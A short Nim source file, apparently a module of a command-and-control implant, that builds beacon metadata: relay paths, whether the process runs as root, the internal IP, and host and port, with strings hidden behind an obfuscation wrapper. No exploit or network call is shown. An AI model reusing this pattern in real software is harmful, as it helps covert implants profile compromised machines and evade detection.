import std/json
from posix import getuid
import ../global
import ../linapi/handlers

proc resolvePrivilege(): string =
  # Returns root when the process runs as root, otherwise default
  let (_, privilege) = formatProcessPrivilege(getuid().int)
  if privilege == obf("root"):
    return obf("root")
  obf("default")

proc createMetadata*(): JsonNode =
  # Builds the metadata object sent with requests
  %*{
    obf("relays"): activeRelayPaths,
    obf("privilege"): resolvePrivilege(),
    obf("internal_ip"): getInternalIp(),
    obf("host"): host,
    obf("port"): port,
  }
